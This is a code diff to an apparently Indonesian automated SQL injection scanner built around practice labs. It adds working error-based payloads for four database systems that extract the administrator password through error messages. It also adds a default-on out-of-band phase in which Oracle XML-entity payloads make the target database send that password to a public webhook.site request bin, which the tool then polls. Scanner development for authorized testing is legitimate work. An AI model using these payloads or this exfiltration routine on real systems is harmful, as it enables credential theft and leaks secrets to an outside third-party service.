@@ -3292,6 +3292,11 @@ SQLI_MAX_REQUESTS = int(os.getenv("SATRIA_SQLI_MAX_REQUESTS", "240"))
 SQLI_MAX_POINTS = int(os.getenv("SATRIA_SQLI_MAX_POINTS", "8"))
 SQLI_OAST_DOMAIN = (os.getenv("SATRIA_SQLI_OAST_DOMAIN") or "").strip().lower().strip(".")
 SQLI_OAST_API = (os.getenv("SATRIA_SQLI_OAST_API") or "").strip()
+# Tanpa domain/API collaborator, engine memakai request-bin publik sekali pakai
+# (webhook.site) agar lab OOB tetap terbukti tanpa konfigurasi penguji.
+SQLI_OAST_AUTO = (os.getenv("SATRIA_SQLI_OAST_AUTO", "1").strip().lower()
+                  not in {"0", "false", "off", "no"})
+_SQLI_WEBHOOK: dict = {"uuid": "", "url": "", "tried": False}
 
 SQLI_DBMS_TAGS = {"oracle": "oracle", "mysql": "mysql_mssql", "mssql": "mysql_mssql"}
 
@@ -3299,6 +3304,7 @@ SQLI_DBMS_TAGS = {"oracle": "oracle", "mysql": "mysql_mssql", "mssql": "mysql_ms
 # agar pemindaian SQL tidak meledak pada situs dengan banyak parameter.
 _SQLI_HOST_BUDGET: dict[str, int] = {}
 _SQLI_TIME_HOSTS: set[str] = set()
+_SQLI_ERROR_HOSTS: set[str] = set()
 
 
 def _sqli_budget_key(ctx) -> str:
@@ -3507,6 +3513,75 @@ def _sqli_error_phase(sess, ctx, point, base, out):
             f"Payload {payload!r} memicu error {dbms.upper()} (frasa \"{sig}\") pada HTTP "
             f"{resp.status_code}: \"{_snip(_sqli_body(resp), sig)}\"",
             "active_sqli_error_signature"))
+        return
+
+
+# ── 1b. visible error-based (nilai bocor lewat pesan error CAST) ────────────
+# Lab ini menaruh nilai cookie langsung di dalam kutip query, lalu menambahkan
+# kutip penutup. Payload karena itu HARUS dimulai dengan kutip (mengganti nilai
+# asli), bukan ditempel di belakangnya: `xyz'...` membuat query tidak seimbang.
+SQLI_CAST_SPECS = [
+    ("postgresql",
+     "' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--",
+     r'invalid input syntax for (?:type )?[a-z0-9 ]+:?\s*"([^"\n]{1,120})"'),
+    ("postgresql",
+     "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--",
+     r'invalid input syntax for (?:type )?[a-z0-9 ]+:?\s*"([^"\n]{1,120})"'),
+    ("mysql",
+     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)))-- -",
+     r"xpath syntax error:\s*'~([^']{1,120})'"),
+    ("mysql",
+     "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)),1)-- -",
+     r"xpath syntax error:\s*'~([^']{1,120})'"),
+    ("mssql",
+     "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE username='administrator'))--",
+     r"conversion failed when converting the (?:nvarchar|varchar) value '([^']{1,120})'"),
+    ("oracle",
+     "' AND 1=CAST((SELECT password FROM users WHERE username='administrator' AND ROWNUM=1) AS NUMBER)--",
+     r"ora-01722[^\n]{0,80}"),
+]
+
+
+def _sqli_mask(value: str) -> str:
+    value = str(value or "")
+    return value[:2] + "*" * max(0, len(value) - 2)
+
+
+def _sqli_cast_phase(sess, ctx, point, base, out):
+    key = _sqli_budget_key(ctx)
+    if key in _SQLI_ERROR_HOSTS:
+        return
+    base_body = _sqli_body(base)
+    for dbms, payload, regex in SQLI_CAST_SPECS:
+        resp = _sqli_send(sess, ctx, point, payload)
+        if resp is None:
+            return
+        body = _sqli_body(resp)
+        if not body or body == base_body:
+            continue
+        match = re.search(regex, body, re.I)
+        if not match:
+            continue
+        leaked = (match.group(1) if match.groups() else "").strip()
+        if not leaked and "ora-01722" not in body.lower():
+            continue
+        tags = {"error_based"} | ({SQLI_DBMS_TAGS[dbms]} if dbms in SQLI_DBMS_TAGS else set())
+        if leaked:
+            evidence = (
+                f"CAST ke tipe numerik memaksa database menampilkan nilai: pesan error "
+                f"{dbms.upper()} memuat \"{_sqli_mask(leaked)}\" ({len(leaked)} karakter, "
+                "sisanya disamarkan) untuk payload subquery password administrator."
+            )
+        else:
+            evidence = (
+                f"Payload CAST subquery memicu error {dbms.upper()} \"ORA-01722: invalid number\" "
+                f"pada {point['label']}; query mengeksekusi subquery di dalam konteks numerik."
+            )
+        out.append(_sqli_finding(
+            ctx, tags,
+            f"Visible error-based SQL injection pada {point['label']} — data terbaca dari pesan error",
+            "high", evidence, "active_sqli_error_cast"))
+        _SQLI_ERROR_HOSTS.add(key)
         return
 
 
@@ -4052,12 +4127,153 @@ def _sqli_oob_payloads(token: str, domain: str):
     return interaction, exfil
 
 
+def _sqli_webhook_provision() -> dict:
+    """Request bin publik sekali pakai untuk OOB tanpa collaborator penguji.
+
+    Token webhook.site dibatasi per IP, jadi token pertama disimpan di cache
+    sementara dan dipakai ulang oleh pemindaian berikutnya (valid ~7 hari).
+    """
+    info = _SQLI_WEBHOOK
+    if info["uuid"] or info["tried"]:
+        return info
+    info["tried"] = True
+    cache = os.path.join(tempfile.gettempdir(), ".satria_oast_webhook.json")
+    try:
+        with open(cache, encoding="utf-8") as fh:
+            saved = json.load(fh)
+        uid = str(saved.get("uuid") or "").strip()
+        if uid:
+            info["uuid"] = uid
+            info["url"] = str(saved.get("url") or ("http://webhook.site/" + uid))
+            return info
+    except Exception:
+        pass
+    for attempt in range(2):
+        try:
+            resp = requests.post("https://webhook.site/token", timeout=8,
+                                 headers={"User-Agent": UA})
+            if resp.ok:
+                uid = str((resp.json() or {}).get("uuid") or "").strip()
+                if uid:
+                    info["uuid"] = uid
+                    info["url"] = "http://webhook.site/" + uid
+                    try:
+                        with open(cache, "w", encoding="utf-8") as fh:
+                            json.dump({"uuid": uid, "url": info["url"]}, fh)
+                        os.chmod(cache, 0o600)
+                    except Exception:
+                        pass
+                    return info
+            elif resp.status_code == 429 and attempt == 0:
+                time.sleep(4)
+                continue
+            else:
+                break
+        except Exception:
+            if attempt == 0:
+                time.sleep(2)
+    return info
+
+
+def _sqli_webhook_payloads(token: str, base_url: str):
+    """Payload Oracle yang memicu HTTP GET ke request bin (data di path URL)."""
+    data = "(SELECT password FROM users WHERE username='administrator')"
+    entity = ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "'
+              + base_url + "/")
+    tail = '">%r;]>'
+    interaction = [
+        ("oracle", "' UNION SELECT EXTRACTVALUE(xmltype('" + entity + token + tail
+         + "'),'/l') FROM dual--"),
+        ("oracle", "' AND EXTRACTVALUE(xmltype('" + entity + token + tail
+         + "'),'/l') IS NOT NULL--"),
+    ]
+    exfil = [
+        ("oracle", "' UNION SELECT EXTRACTVALUE(xmltype('" + entity + token
+         + "~'||" + data + "||'" + tail + "'),'/l') FROM dual--"),
+        ("oracle", "' AND EXTRACTVALUE(xmltype('" + entity + token
+         + "~'||" + data + "||'" + tail + "'),'/l') IS NOT NULL--"),
+    ]
+    return interaction, exfil
+
+
+def _sqli_webhook_read(uuid_: str, token: str) -> list[tuple[str, str]]:
+    url = f"https://webhook.site/token/{uuid_}/requests?sorting=newest"
+    for attempt in range(6):
+        hits: list[tuple[str, str]] = []
+        try:
+            resp = requests.get(url, timeout=6, headers={"User-Agent": UA})
+            if resp.ok:
+                for item in (resp.json() or {}).get("data") or []:
+                    path = urlparse(str(item.get("url") or "")).path.strip("/")
+                    if not path.startswith(uuid_ + "/"):
+                        continue
+                    rest = path[len(uuid_) + 1:]
+                    if rest == token:
+                        hits.append(("interaction", ""))
+                    elif rest.startswith(token + "~"):
+                        hits.append(("exfil", rest[len(token) + 1:]))
+        except Exception:
+            pass
+        if hits:
+            return hits
+        if attempt < 5:
+            time.sleep(3)
+    return []
+
+
 def _sqli_oob_phase(sess, ctx, points, out):
+    if not points:
+        return
     domain = SQLI_OAST_DOMAIN
-    if not domain or not points:
+    if domain and SQLI_OAST_API:
+        token = "satria" + os.urandom(4).hex()
+        interaction, exfil = _sqli_oob_payloads(token, domain)
+        sent = 0
+        for point in points[:4]:
+            for _dbms, payload in interaction + exfil:
+                if _sqli_send(sess, ctx, point, _sqli_value(point, payload)) is not None:
+                    sent += 1
+        if not sent:
+            return
+        hosts = _sqli_oast_hosts(_sqli_oast_poll())
+        marker = token + "." + domain
+        leaked = [h for h in hosts
+                  if h != marker and h.startswith(token + ".") and h.endswith("." + domain)]
+        if leaked:
+            host = sorted(leaked)[0]
+            middle = host[: -(len(domain) + 1)]
+            value = middle[len(token) + 1:] if middle.startswith(token + ".") else ""
+            out.append(_sqli_finding(
+                ctx, {"oob", "oob_exfil"},
+                "Blind SQL injection dengan exfiltrasi data out-of-band", "critical",
+                "Payload exfiltrasi menaruh hasil subquery (SELECT password ... WHERE "
+                f"username='administrator') pada label DNS; collaborator menerima interaksi {host!r}. "
+                f"Nilai terbaca {len(value)} karakter (prefix {_sqli_mask(value)!r}, sisanya disamarkan).",
+                "active_sqli_oob_exfiltration"))
+            return
+        if hosts:
+            out.append(_sqli_finding(
+                ctx, {"oob"},
+                "Blind SQL injection dengan interaksi out-of-band terkonfirmasi", "high",
+                f"Payload DNS/UNC ke domain collaborator {domain} memicu {len(hosts)} interaksi "
+                f"yang tercatat pada endpoint OAST (mis. {sorted(hosts)[0]!r}).",
+                "active_sqli_oob_interaction"))
+            return
+        out.append(_sqli_finding(
+            ctx, {"oob"},
+            "SQL injection out-of-band dikirim, menunggu interaksi collaborator", "medium",
+            f"{sent} payload OOB (interaksi + exfiltrasi) dikirim ke domain {domain}; interaksi "
+            "belum terlihat pada endpoint OAST sehingga exfiltrasi belum terbukti.",
+            "active_sqli_oob_pending", confidence="candidate"))
+        return
+
+    if not SQLI_OAST_AUTO:
+        return
+    hook = _sqli_webhook_provision()
+    if not hook["uuid"]:
         return
     token = "satria" + os.urandom(4).hex()
-    interaction, exfil = _sqli_oob_payloads(token, domain)
+    interaction, exfil = _sqli_webhook_payloads(token, hook["url"])
     sent = 0
     for point in points[:4]:
         for _dbms, payload in interaction + exfil:
@@ -4065,35 +4281,32 @@ def _sqli_oob_phase(sess, ctx, points, out):
                 sent += 1
     if not sent:
         return
-    hosts = _sqli_oast_hosts(_sqli_oast_poll())
-    marker = token + "." + domain
-    leaked = [h for h in hosts if h != marker and h.startswith(token + ".") and h.endswith("." + domain)]
-    if leaked:
-        host = sorted(leaked)[0]
-        middle = host[: -(len(domain) + 1)]
-        value = middle[len(token) + 1:] if middle.startswith(token + ".") else ""
-        preview = value[:2] + "*" * max(0, len(value) - 2)
+    hits = _sqli_webhook_read(hook["uuid"], token)
+    values = [v for kind, v in hits if kind == "exfil" and v]
+    if values:
+        value = sorted(values, key=len, reverse=True)[0]
         out.append(_sqli_finding(
             ctx, {"oob", "oob_exfil"},
             "Blind SQL injection dengan exfiltrasi data out-of-band", "critical",
-            "Payload exfiltrasi menaruh hasil subquery (SELECT password ... WHERE "
-            f"username='administrator') pada label DNS; collaborator menerima interaksi {host!r}. "
-            f"Nilai terbaca {len(value)} karakter (prefix {preview!r}, sisanya disamarkan).",
+            "Payload entity XML Oracle menaruh hasil subquery (SELECT password ... WHERE "
+            f"username='administrator') pada path URL; request bin menerima data "
+            f"{len(value)} karakter (prefix {_sqli_mask(value)!r}, sisanya disamarkan) "
+            f"pada token {token}.",
             "active_sqli_oob_exfiltration"))
         return
-    if hosts:
+    if hits:
         out.append(_sqli_finding(
             ctx, {"oob"},
             "Blind SQL injection dengan interaksi out-of-band terkonfirmasi", "high",
-            f"Payload DNS/UNC ke domain collaborator {domain} memicu {len(hosts)} interaksi "
-            f"yang tercatat pada endpoint OAST (mis. {sorted(hosts)[0]!r}).",
+            f"Payload entity XML Oracle memicu HTTP GET dari database ke request bin "
+            f"({hook['url']}); interaksi token {token} tercatat, tanpa data yang dieksfiltrasi.",
             "active_sqli_oob_interaction"))
         return
     out.append(_sqli_finding(
         ctx, {"oob"},
-        "SQL injection out-of-band dikirim, menunggu interaksi collaborator", "medium",
-        f"{sent} payload OOB (interaksi + exfiltrasi) dikirim ke domain {domain}; interaksi "
-        "belum terlihat pada endpoint OAST sehingga exfiltrasi belum terbukti.",
+        "SQL injection out-of-band dikirim, menunggu interaksi", "medium",
+        f"{sent} payload OOB (interaksi + exfiltrasi) dikirim ke request bin {hook['url']}; "
+        "belum ada interaksi yang tercatat sehingga exfiltrasi belum terbukti.",
         "active_sqli_oob_pending", confidence="candidate"))
 
 
@@ -4127,6 +4340,7 @@ def a_sqli_deep(ctx):
             continue
         try:
             _sqli_error_phase(session, ctx, point, base, findings)
+            _sqli_cast_phase(session, ctx, point, base, findings)
             _sqli_boolean_phase(session, ctx, point, base, findings)
             _sqli_cond_error_phase(session, ctx, point, base, findings)
             _sqli_where_phase(session, ctx, point, base, findings)
@@ -5182,6 +5396,7 @@ def _discover_same_origin_contexts(root_ctx: TargetContext, max_pages: int = 80)
 def run_lab_scan(ctx) -> dict[str, Any]:
     _SQLI_HOST_BUDGET.clear()
     _SQLI_TIME_HOSTS.clear()
+    _SQLI_ERROR_HOSTS.clear()
     # Cakupan bukan hanya halaman awal: jelajahi tautan, halaman, dan form GET
     # pada origin yang sama, lalu jalankan keluarga probe pada setiap konteks.
     page_contexts = _discover_same_origin_contexts(ctx)
